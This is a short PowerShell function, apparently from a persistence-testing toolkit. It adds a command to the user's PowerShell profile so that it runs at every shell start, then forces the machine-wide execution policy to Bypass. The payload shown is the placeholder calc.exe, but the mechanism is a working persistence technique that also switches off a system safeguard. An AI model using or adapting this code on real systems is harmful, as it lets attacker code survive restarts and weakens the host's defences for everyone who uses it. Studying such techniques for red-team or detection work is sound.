# PowerShell Profile
#----------------------------------------------------------------------------------------------------------------------------------#
function PowerShell_Profile_Persist {
Write-host -ForegroundColor Yellow "Set PowerShell Profile..."
Start-Sleep 2
$file = "C:\Users\$env:USERNAME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
$test = Test-Path $file

if ($test) {
$content = Get-Content $file
Add-Content $profile 'calc.exe'
}

else {
New-Item -Path $file -Type File –Force
$string = 'calc.exe'
$string | Out-File -FilePath $file -Append
}
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -force
Write-host -ForegroundColor Green "Done!"
}
